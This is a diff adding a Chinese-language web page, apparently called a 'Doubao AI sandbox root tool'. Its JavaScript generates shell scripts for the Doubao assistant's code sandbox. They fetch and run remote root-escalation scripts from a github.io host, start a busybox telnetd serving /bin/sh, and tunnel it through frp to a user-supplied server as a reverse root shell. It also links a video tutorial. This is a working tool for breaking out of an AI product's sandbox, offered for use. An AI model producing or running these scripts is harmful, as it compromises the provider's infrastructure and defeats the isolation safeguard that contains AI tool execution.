@@ -1,0 +1,813 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>豆包AI沙盒root工具</title>
+    <style>
+        :root {
+            --bg: #f8f9fa;
+            --card-bg: #ffffff;
+            --text: #1e293b;
+            --text-secondary: #64748b;
+            --text-muted: #94a3b8;
+            --border: #e2e8f0;
+            --accent: #3b82f6;
+            --accent-light: #eff6ff;
+            --danger: #ef4444;
+            --radius: 14px;
+            --radius-sm: 8px;
+            --shadow: 0 1px 3px rgba(0, 0, 0, 0.06), 0 4px 16px rgba(0, 0, 0, 0.04);
+            --transition: 0.28s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: system-ui, -apple-system, 'Segoe UI', sans-serif;
+            background: var(--bg);
+            min-height: 100vh;
+            min-height: 100dvh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            -webkit-font-smoothing: antialiased;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .card {
+            background: var(--card-bg);
+            border-radius: var(--radius);
+            box-shadow: var(--shadow);
+            width: 100%;
+            max-width: 420px;
+            padding: 28px 24px 24px;
+            position: relative;
+            overflow: hidden;
+            transition: min-height var(--transition);
+        }
+
+        .steps {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            margin-bottom: 24px;
+            flex-wrap: wrap;
+        }
+        .step-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: var(--border);
+            transition: all var(--transition);
+            flex-shrink: 0;
+        }
+        .step-dot.done {
+            background: var(--accent);
+            box-shadow: 0 0 0 3px var(--accent-light);
+        }
+        .step-dot.active {
+            background: var(--accent);
+            box-shadow: 0 0 0 5px var(--accent-light);
+            width: 12px;
+            height: 12px;
+        }
+        .step-line {
+            width: 18px;
+            height: 2px;
+            background: var(--border);
+            border-radius: 1px;
+            transition: background var(--transition);
+            flex-shrink: 0;
+        }
+        .step-line.done {
+            background: var(--accent);
+        }
+        .step-label-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 6px;
+            padding: 0 2px;
+        }
+        .step-label {
+            font-size: 0.7rem;
+            color: var(--text-muted);
+            font-weight: 500;
+            transition: color var(--transition);
+            text-align: center;
+            flex: 1;
+        }
+        .step-label.active {
+            color: var(--accent);
+            font-weight: 600;
+        }
+        .step-label.done {
+            color: var(--accent);
+        }
+
+        .page {
+            display: none;
+            animation: pageIn 0.32s ease;
+        }
+        .page.active {
+            display: block;
+        }
+        @keyframes pageIn {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .avatar-wrapper {
+            text-align: center;
+            margin-bottom: 8px;
+        }
+        .avatar {
+            width: 64px;
+            height: 64px;
+            border-radius: 50%;
+            object-fit: cover;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.06);
+        }
+        .page-title {
+            font-size: 1.3rem;
+            font-weight: 600;
+            color: var(--text);
+            text-align: center;
+            margin-bottom: 6px;
+            letter-spacing: -0.2px;
+        }
+        .page-subtitle {
+            font-size: 0.85rem;
+            color: var(--text-secondary);
+            text-align: center;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+
+        .btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            height: 46px;
+            border-radius: var(--radius-sm);
+            font-size: 0.95rem;
+            font-weight: 500;
+            cursor: pointer;
+            border: 1px solid var(--border);
+            background: var(--card-bg);
+            color: var(--text);
+            transition: all var(--transition);
+            outline: none;
+            margin-bottom: 10px;
+            gap: 8px;
+            -webkit-tap-highlight-color: transparent;
+            user-select: none;
+        }
+        .btn:last-child {
+            margin-bottom: 0;
+        }
+        .btn:hover {
+            background: #f8fafc;
+            border-color: #cbd5e1;
+        }
+        .btn:active {
+            background: #f1f5f9;
+            transform: scale(0.985);
+        }
+        .btn:focus-visible {
+            outline: 2px solid var(--accent);
+            outline-offset: 2px;
+        }
+        .btn.primary {
+            background: var(--accent);
+            color: #fff;
+            border-color: var(--accent);
+            font-weight: 600;
+        }
+        .btn.primary:hover {
+            background: #2563eb;
+            border-color: #2563eb;
+        }
+        .btn.primary:active {
+            background: #1d4ed8;
+            transform: scale(0.985);
+        }
+        .btn.back-btn {
+            background: transparent;
+            border-color: transparent;
+            color: var(--text-secondary);
+            font-weight: 400;
+            font-size: 0.88rem;
+            height: 38px;
+            width: auto;
+            display: inline-flex;
+            padding: 0 12px;
+            margin-bottom: 16px;
+        }
+        .btn.back-btn:hover {
+            color: var(--text);
+            background: rgba(0, 0, 0, 0.03);
+        }
+
+        .input-group {
+            margin-bottom: 14px;
+        }
+        .input-group label {
+            display: block;
+            font-size: 0.82rem;
+            font-weight: 600;
+            color: var(--text);
+            margin-bottom: 5px;
+            letter-spacing: -0.1px;
+        }
+        .input-group .hint {
+            font-size: 0.72rem;
+            color: var(--text-muted);
+            font-weight: 400;
+            margin-bottom: 6px;
+            line-height: 1.4;
+        }
+        .input-group input {
+            width: 100%;
+            height: 44px;
+            border-radius: var(--radius-sm);
+            border: 1px solid var(--border);
+            padding: 0 14px;
+            font-size: 0.93rem;
+            color: var(--text);
+            background: var(--card-bg);
+            transition: all var(--transition);
+            outline: none;
+            -webkit-appearance: none;
+        }
+        .input-group input:focus {
+            border-color: var(--accent);
+            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
+        }
+        .input-group input.error {
+            border-color: var(--danger);
+            box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.08);
+            animation: shake 0.4s ease;
+        }
+        @keyframes shake {
+            0%,
+            100% {
+                transform: translateX(0);
+            }
+            20% {
+                transform: translateX(-6px);
+            }
+            40% {
+                transform: translateX(6px);
+            }
+            60% {
+                transform: translateX(-4px);
+            }
+            80% {
+                transform: translateX(4px);
+            }
+        }
+
+        .bilibili-link {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 20px;
+            padding: 12px 16px;
+            border-radius: var(--radius-sm);
+            background: #fff5f5;
+            border: 1px solid #fecaca;
+            text-decoration: none;
+            color: #dc2626;
+            font-size: 0.85rem;
+            font-weight: 500;
+            transition: all var(--transition);
+        }
+        .bilibili-link:hover {
+            background: #fef2f2;
+            border-color: #fca5a5;
+        }
+        .bilibili-link:active {
+            transform: scale(0.98);
+            background: #fee2e2;
+        }
+        .bilibili-link .bili-icon {
+            font-size: 1.3rem;
+            line-height: 1;
+        }
+        .bilibili-link .bili-arrow {
+            margin-left: auto;
+            font-size: 0.9rem;
+            opacity: 0.6;
+        }
+
+        .script-box {
+            margin-bottom: 14px;
+            position: relative;
+            border: 1px solid var(--border);
+            border-radius: var(--radius-sm);
+            overflow: hidden;
+        }
+        .script-box-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 10px 12px;
+            background: #fafbfc;
+            border-bottom: 1px solid var(--border);
+        }
+        .script-box-title {
+            font-size: 0.82rem;
+            font-weight: 600;
+            color: var(--text);
+        }
+        .copy-btn {
+            font-size: 0.72rem;
+            font-weight: 500;
+            color: var(--accent);
+            background: none;
+            border: 1px solid var(--accent);
+            border-radius: 5px;
+            padding: 4px 12px;
+            cursor: pointer;
+            transition: all var(--transition);
+            -webkit-tap-highlight-color: transparent;
+            white-space: nowrap;
+        }
+        .copy-btn:hover {
+            background: var(--accent-light);
+        }
+        .copy-btn:active {
+            background: #dbeafe;
+            transform: scale(0.95);
+        }
+        .copy-btn.copied {
+            background: #dcfce7;
+            border-color: #22c55e;
+            color: #16a34a;
+        }
+        .code-block {
+            background: #f8fafc;
+            padding: 12px;
+            font-family: 'SF Mono', 'Cascadia Code', 'Consolas', 'Monaco', 'Courier New', monospace;
+            font-size: 0.75rem;
+            line-height: 1.55;
+            white-space: pre-wrap;
+            word-break: break-all;
+            color: #334155;
+            max-height: 130px;
+            overflow-y: auto;
+            -webkit-overflow-scrolling: touch;
+        }
+
+        @media (max-width: 420px) {
+            .card {
+                padding: 22px 16px 20px;
+                border-radius: 12px;
+            }
+            .page-title {
+                font-size: 1.15rem;
+            }
+            .btn {
+                height: 42px;
+                font-size: 0.9rem;
+            }
+            .code-block {
+                font-size: 0.7rem;
+                max-height: 110px;
+            }
+            .bilibili-link {
+                font-size: 0.78rem;
+                padding: 10px 12px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="card" id="card">
+        <div class="step-label-row" id="stepLabels"></div>
+        <div class="steps" id="stepDots"></div>
+
+        <!-- ====== PAGE: Mode Selection ====== -->
+        <div class="page active" data-page="mode" id="pageMode">
+            <div class="avatar-wrapper">
+                <img class="avatar" src="https://lf-flow-web-cdn.doubao.com/obj/flow-doubao/doubao/web/doubao_avatar.png" alt="豆包头像">
+            </div>
+            <div class="page-title">豆包AI沙盒root工具</div>
+            <div class="page-subtitle">请选择你当前使用的模式</div>
+            <button class="btn" data-action="selectMode" data-mode="fast">⚡ 我正在使用快速/专家模式</button>
+            <button class="btn" data-action="selectMode" data-mode="office">💼 我正在使用办公模式</button>
+
+            <!-- B站视频链接 -->
+            <a class="bilibili-link"
+               href="https://b23.tv/colfB7U"
+               target="_blank"
+               rel="noopener noreferrer">
+                <span class="bili-icon">📺</span>
+                <span>视频教程：？！豆包反弹root shell！？</span>
+                <span style="font-size:0.72rem;color:#94a3b8;margin-left:4px;">作者 独の光</span>
+                <span class="bili-arrow">↗</span>
+            </a>
+        </div>
+
+        <!-- ====== PAGE: Usage Selection ====== -->
+        <div class="page" data-page="usage" id="pageUsage">
+            <button class="btn back-btn" data-action="back">← 返回</button>
+            <div class="page-title">选择使用方式</div>
+            <div class="page-subtitle" id="usageModeLabel"></div>
+            <button class="btn" data-action="selectUsage" data-usage="app">📱 我只想在豆包APP内使用</button>
+            <button class="btn" data-action="selectUsage" data-usage="shell">🖥️ 我还想要反弹shell</button>
+        </div>
+
+        <!-- ====== PAGE: Shell Config ====== -->
+        <div class="page" data-page="shellConfig" id="pageShellConfig">
+            <button class="btn back-btn" data-action="back">← 返回</button>
+            <div class="page-title">反弹Shell 配置</div>
+            <div class="page-subtitle">填写你的公网服务器信息</div>
+            <div class="input-group">
+                <label for="inpIP">公网服务器 IP 地址</label>
+                <div class="hint">用于接收反弹 Shell 的服务器公网 IP</div>
+                <input type="text" id="inpIP" placeholder="例如：123.45.67.89" autocomplete="off">
+            </div>
+            <div class="input-group">
+                <label for="inpFrpsPort">frps 服务端口</label>
+                <div class="hint">公网服务器上 frps 的 bind_port</div>
+                <input type="number" id="inpFrpsPort" placeholder="例如：7000" autocomplete="off">
+            </div>
+            <div class="input-group">
+                <label for="inpFrpcPort">frpc 代理端口</label>
+                <div class="hint">用于映射沙盒 telnet 的远程端口</div>
+                <input type="number" id="inpFrpcPort" placeholder="例如：6000" autocomplete="off">
+            </div>
+            <button class="btn primary" data-action="generateShell">生成脚本</button>
+        </div>
+
+        <!-- ====== PAGE: Result ====== -->
+        <div class="page" data-page="result" id="pageResult">
+            <button class="btn back-btn" data-action="back">← 返回</button>
+            <div class="page-title" id="resultTitle"></div>
+            <div class="page-subtitle" id="resultSubtitle"></div>
+            <div id="resultScripts"></div>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            // ============ Constants ============
+            const BASE_URL = 'https://kenimeiron.github.io/ai-made-tools';
+            const URLS = {
+                frps: `${BASE_URL}/frps`,
+                frpc: `${BASE_URL}/frpc`,
+                busybox: `${BASE_URL}/busybox`,
+                rootOld: `${BASE_URL}/root-old.sh`,
+                rootNew: `${BASE_URL}/root-new.sh`
+            };
+            const TELNET_PORT = 1234;
+
+            // ============ Script Generation ============
+            function buildScript(lines) { return lines.join('\n'); }
+
+            function dl(url, path) {
+                return `(curl -fsSL "${url}" -o "${path}" || wget -O "${path}" "${url}")`;
+            }
+
+            function wf(path, content) {
+                const delim = 'E' + Math.random().toString(36).slice(2);
+                return `cat > "${path}" << '${delim}'\n${content}\n${delim}`;
+            }
+
+            function nh(cmd, log) { return `nohup ${cmd} > "${log}" 2>&1 &`; }
+
+            // ① 服务端 frps 脚本 —— 同时下载 busybox 并赋权
+            function genFrps(port) {
+                return buildScript([
+                    '#!/bin/sh',
+                    dl(URLS.frps, '/tmp/frps'),
+                    dl(URLS.busybox, '/tmp/busybox'),
+                    'chmod +x /tmp/frps /tmp/busybox',
+                    wf('/tmp/frps.toml', `bindPort = ${port}`),
+                    nh('/tmp/frps -c /tmp/frps.toml', '/tmp/frps.log'),
+                    'exit 0'
+                ]);
+            }
+
+            // ② 提权脚本
+            function genRoot(mode) {
+                const url = mode === 'expert' ? URLS.rootOld : URLS.rootNew;
+                return buildScript([
+                    '#!/bin/sh',
+                    dl(url, '/tmp/root.sh'),
+                    'chmod +x /tmp/root.sh',
+                    '/tmp/root.sh',
+                    'exit 0'
+                ]);
+            }
+
+            // ③ 反弹 Shell 脚本（沙盒端）
+            function genFrpc(serverIP, frpsPort, frpcPort) {
+                return buildScript([
+                    '#!/bin/sh',
+                    dl(URLS.frpc, '/tmp/frpc'),
+                    dl(URLS.busybox, '/tmp/busybox'),
+                    'chmod +x /tmp/frpc /tmp/busybox',
+                    nh(`/tmp/busybox telnetd -p ${TELNET_PORT} -l /bin/sh`, '/tmp/telnetd.log'),
+                    wf('/tmp/frpc.toml',
+                        `serverAddr = "${serverIP}"\nserverPort = ${frpsPort}\n\n[[proxies]]\nname = "shell"\ntype = "tcp"\nlocalIP = "127.0.0.1"\nlocalPort = ${TELNET_PORT}\nremotePort = ${frpcPort}`
+                        ),
+                    nh('/tmp/frpc -c /tmp/frpc.toml', '/tmp/frpc.log'),
+                    'exit 0'
+                ]);
+            }
+
+            // ④ 一键连接脚本（服务端执行，用 busybox telnet 连入沙盒）
+            function genConnect(frpcPort) {
+                return buildScript([
+                    '#!/bin/sh',
+                    '# 使用 busybox telnet 连接到沙盒',
+                    '# 前提：frps 已在本机运行，沙盒端 frpc 已建立隧道',
+                    `/tmp/busybox telnet 127.0.0.1 ${frpcPort}`,
+                    'exit 0'
+                ]);
+            }
+
+            function generateScripts(opts) {
+                if (opts.appOnly) {
+                    return [
+                        { title: '提权脚本', code: genRoot(opts.mode) }
+                    ];
+                }
+                return [
+                    { title: '① 服务端 frps 脚本', code: genFrps(opts.frpsPort),
+                        hint: '在公网服务器上执行，启动 frps 并下载 busybox' },
+                    { title: '② 提权脚本', code: genRoot(opts.mode),
+                        hint: '在豆包沙盒中执行，获取 root 权限' },
+                    { title: '③ 反弹 Shell 脚本（沙盒端）', code: genFrpc(opts.serverIP, opts.frpsPort, opts
+                            .frpcPort),
+                        hint: '在豆包沙盒中执行，建立 frpc 隧道并启动 telnetd' },
+                    { title: '④ 一键连接脚本（服务端）', code: genConnect(opts.frpcPort),
+                        hint: '在公网服务器上执行，直接用 busybox telnet 连入沙盒' }
+                ];
+            }
+
+            // ============ State ============
+            const state = {
+                mode: null,
+                usage: null,
+                shellData: { ip: '', frpsPort: '', frpcPort: '' },
+                pageHistory: ['mode'],
+                currentPage: 'mode'
+            };
+            const modeLabelMap = { fast: '快速/专家模式', office: '办公模式' };
+            const modeCodeMap = { fast: 'expert', office: 'office' };
+
+            // ============ DOM refs ============
+            const card = document.getElementById('card');
+            const pageMode = document.getElementById('pageMode');
+            const pageUsage = document.getElementById('pageUsage');
+            const pageShellConfig = document.getElementById('pageShellConfig');
+            const pageResult = document.getElementById('pageResult');
+            const usageModeLabel = document.getElementById('usageModeLabel');
+            const resultTitle = document.getElementById('resultTitle');
+            const resultSubtitle = document.getElementById('resultSubtitle');
+            const resultScripts = document.getElementById('resultScripts');
+            const stepLabels = document.getElementById('stepLabels');
+            const stepDots = document.getElementById('stepDots');
+            const inpIP = document.getElementById('inpIP');
+            const inpFrpsPort = document.getElementById('inpFrpsPort');
+            const inpFrpcPort = document.getElementById('inpFrpcPort');
+
+            const pageMap = { mode: pageMode, usage: pageUsage, shellConfig: pageShellConfig, result: pageResult };
+
+            // ============ Navigation ============
+            function navigateTo(pageName, pushHistory = true) {
+                const prevPage = state.currentPage;
+                if (prevPage === pageName) return;
+                Object.values(pageMap).forEach(p => p.classList.remove('active'));
+                const target = pageMap[pageName];
+                if (target) {
+                    target.classList.remove('active');
+                    void target.offsetHeight;
+                    target.classList.add('active');
+                }
+                if (pushHistory && prevPage) state.pageHistory.push(pageName);
+                state.currentPage = pageName;
+                if (pageName === 'result') renderResultPage();
+                if (pageName === 'shellConfig') {
+                    inpIP.value = state.shellData.ip;
+                    inpFrpsPort.value = state.shellData.frpsPort;
+                    inpFrpcPort.value = state.shellData.frpcPort;
+                }
+                if (pageName === 'usage') {
+                    usageModeLabel.textContent = state.mode ? `当前模式：${modeLabelMap[state.mode]}` : '';
+                }
+                updateStepIndicator();
+            }
+
+            function goBack() {
+                if (state.pageHistory.length <= 1) return;
+                state.pageHistory.pop();
+                navigateTo(state.pageHistory[state.pageHistory.length - 1], false);
+            }
+
+            // ============ Step Indicator ============
+            function updateStepIndicator() {
+                const isShell = state.usage === 'shell';
+                const steps = isShell ?
+                    ['选择模式', '选择用途', '配置参数', '生成结果'] :
+                    ['选择模式', '选择用途', '生成结果'];
+                const currentIdx = steps.indexOf(
+                    state.currentPage === 'mode' ? '选择模式' :
+                    state.currentPage === 'usage' ? '选择用途' :
+                    state.currentPage === 'shellConfig' ? '配置参数' : '生成结果'
+                );
+                stepLabels.innerHTML = steps.map((s, i) => {
+                    let cls = i < currentIdx ? 'done' : i === currentIdx ? 'active' : '';
+                    return `<span class="step-label ${cls}">${s}</span>`;
+                }).join('');
+                let dotsHTML = '';
+                for (let i = 0; i < steps.length; i++) {
+                    if (i > 0) dotsHTML +=
+                        `<span class="step-line${i <= currentIdx ? ' done' : ''}"></span>`;
+                    let dotCls = i < currentIdx ? 'done' : i === currentIdx ? 'active' : '';
+                    dotsHTML += `<span class="step-dot ${dotCls}"></span>`;
+                }
+                stepDots.innerHTML = dotsHTML;
+            }
+
+            // ============ Result Rendering ============
+            function renderResultPage() {
+                const mode = modeCodeMap[state.mode] || 'expert';
+                const isApp = state.usage === 'app';
+                const scripts = isApp ?
+                    generateScripts({ mode, appOnly: true }) :
+                    generateScripts({
+                        mode,
+                        appOnly: false,
+                        serverIP: state.shellData.ip,
+                        frpsPort: state.shellData.frpsPort,
+                        frpcPort: state.shellData.frpcPort
+                    });
+
+                resultTitle.textContent = isApp ? 'APP 内使用 · 提权脚本' : '反弹 Shell · 全套脚本';
+                resultSubtitle.textContent = isApp ?
+                    '复制下方脚本到豆包APP沙盒终端中执行' :
+                    `服务器 ${state.shellData.ip}  ·  frps:${state.shellData.frpsPort}  ·  frpc:${state.shellData.frpcPort}`;
+
+                resultScripts.innerHTML = scripts.map((s, idx) => `
+                    <div class="script-box">
+                        <div class="script-box-header">
+                            <span class="script-box-title">📄 ${escapeHtml(s.title)}</span>
+                            <button class="copy-btn" data-copy="${encodeURIComponent(s.code)}" data-idx="${idx}">复制</button>
+                        </div>
+                        ${s.hint ? `<div style="padding:6px 12px;font-size:0.72rem;color:var(--text-muted);background:#fafbfc;">💡 ${escapeHtml(s.hint)}</div>` : ''}
+                        <pre class="code-block">${escapeHtml(s.code)}</pre>
+                    </div>
+                `).join('');
+            }
+
+            function escapeHtml(str) {
+                const div = document.createElement('div');
+                div.textContent = str;
+                return div.innerHTML;
+            }
+
+            // ============ Copy ============
+            function handleCopy(btn) {
+                const encoded = btn.getAttribute('data-copy');
+                if (!encoded) return;
+                const code = decodeURIComponent(encoded);
+                const doFeedback = () => {
+                    const orig = btn.textContent;
+                    btn.textContent = '✓ 已复制';
+                    btn.classList.add('copied');
+                    setTimeout(() => { btn.textContent = orig;
+                        btn.classList.remove('copied'); }, 1800);
+                };
+                if (navigator.clipboard && navigator.clipboard.writeText) {
+                    navigator.clipboard.writeText(code).then(doFeedback).catch(() => {
+                        fallbackCopy(code);
+                        doFeedback();
+                    });
+                } else {
+                    fallbackCopy(code);
+                    doFeedback();
+                }
+            }
+
+            function fallbackCopy(text) {
+                const ta = document.createElement('textarea');
+                ta.value = text;
+                ta.style.cssText = 'position:fixed;opacity:0;pointer-events:none;';
+                document.body.appendChild(ta);
+                ta.select();
+                try { document.execCommand('copy'); } catch (e) {}
+                document.body.removeChild(ta);
+            }
+
+            // ============ Validation ============
+            function showError(input) {
+                input.classList.add('error');
+                input.focus();
+                setTimeout(() => input.classList.remove('error'), 600);
+            }
+
+            function validateShellConfig() {
+                const ip = inpIP.value.trim();
+                const fp = inpFrpsPort.value.trim();
+                const fpc = inpFrpcPort.value.trim();
+                if (!ip) { showError(inpIP); return false; }
+                if (!fp || isNaN(Number(fp)) || Number(fp) < 1 || Number(fp) > 65535) { showError(
+                        inpFrpsPort); return false; }
+                if (!fpc || isNaN(Number(fpc)) || Number(fpc) < 1 || Number(fpc) > 65535) { showError(
+                        inpFrpcPort); return false; }
+                const parts = ip.split('.');
+                if (parts.length !== 4 || parts.some(p => isNaN(Number(p)) || Number(p) < 0 || Number(p) > 255)) {
+                    if (!/^[a-zA-Z0-9]/.test(ip) || ip.includes(' ')) { showError(inpIP); return false; }
+                }
+                return true;
+            }
+
+            // ============ Events ============
+            card.addEventListener('click', function(e) {
+                const btn = e.target.closest('[data-action]');
+                if (!btn) return;
+                const action = btn.getAttribute('data-action');
+                switch (action) {
+                    case 'selectMode':
+                        state.mode = btn.getAttribute('data-mode');
+                        state.usage = null;
+                        state.shellData = { ip: '', frpsPort: '', frpcPort: '' };
+                        state.pageHistory = ['mode'];
+                        navigateTo('usage');
+                        break;
+                    case 'selectUsage':
+                        state.usage = btn.getAttribute('data-usage');
+                        if (state.usage === 'app') {
+                            navigateTo('result');
+                        } else {
+                            state.shellData = { ip: '', frpsPort: '', frpcPort: '' };
+                            inpIP.value = inpFrpsPort.value = inpFrpcPort.value = '';
+                            navigateTo('shellConfig');
+                        }
+                        break;
+                    case 'generateShell':
+                        if (!validateShellConfig()) return;
+                        state.shellData = {
+                            ip: inpIP.value.trim(),
+                            frpsPort: inpFrpsPort.value.trim(),
+                            frpcPort: inpFrpcPort.value.trim()
+                        };
+                        navigateTo('result');
+                        break;
+                    case 'back':
+                        goBack();
+                        break;
+                }
+            });
+
+            card.addEventListener('click', function(e) {
+                const copyBtn = e.target.closest('.copy-btn');
+                if (!copyBtn) return;
+                e.preventDefault();
+                handleCopy(copyBtn);
+            });
+
+            card.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter' && state.currentPage === 'shellConfig') {
+                    if (document.activeElement === inpIP || document.activeElement === inpFrpsPort ||
+                        document.activeElement === inpFrpcPort) {
+                        e.preventDefault();
+                        if (!validateShellConfig()) return;
+                        state.shellData = {
+                            ip: inpIP.value.trim(),
+                            frpsPort: inpFrpsPort.value.trim(),
+                            frpcPort: inpFrpcPort.value.trim()
+                        };
+                        navigateTo('result');
+                    }
+                }
+                if (e.key === 'Escape') goBack();
+            });
+
+            // ============ Init ============
+            updateStepIndicator();
+            console.log('✅ 豆包AI沙盒root工具 · 多页表单版已就绪');
+        })();
+    </script>
+</body>
+</html>
